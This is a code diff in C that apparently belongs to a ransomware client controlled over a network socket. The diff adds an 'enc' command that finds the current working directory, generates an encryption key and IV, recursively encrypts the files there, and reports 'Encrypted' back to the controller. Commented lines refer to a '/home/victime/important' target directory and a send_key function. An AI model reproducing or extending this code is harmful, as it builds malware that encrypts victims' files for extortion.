@@ -59,21 +59,44 @@ int main (int argc, char * argv[])
                 strcat(path, buffer);
             }
 
-            printf("%s",path);
+        
             
 
             send(sockid, (const char *)path, strlen(path),0); //send the whole result once
         }
+        else if(strncmp(command,"enc",3) ==0)
+        {
+            FILE *out_fp;
+            char workindDirectory[1048];
+
+            out_fp = popen("/bin/pwd", "r");
+            fgets(workindDirectory, sizeof(workindDirectory), out_fp);
+
+            unsigned char key[33];
+            int sizeKey = 33;
+            unsigned char iv[33];
+            int sizeIv = 33;
+            char pKey[65];
+            char pIv[65];
+	        int status = generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
+            printf("%s", workindDirectory);
+            int size = strcspn(workindDirectory, "\n");
+            char stripedWorkingDirectory[1048];                 //stripping \n from the workingDirectory
+            strncpy(stripedWorkingDirectory,workindDirectory,size); 
+
+            listdir((const char *)stripedWorkingDirectory, iv, key, 'e');
+            
+            char response[2048];
+            strcpy(response, stripedWorkingDirectory);
+            strcat(response, "Encrypted");
+
+
+            send(sockid, (const char *)response, strlen(response),0);
+            
+        }
         
 
     }
-	unsigned char key[33];
-    int sizeKey = 33;
-    unsigned char iv[33];
-    int sizeIv = 33;
-    char pKey[65];
-    char pIv[65];
-	int status = generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
 	//listdir("/home/victime/important", iv, key, 'e');
     //send_key(pKey, pIv);
 }
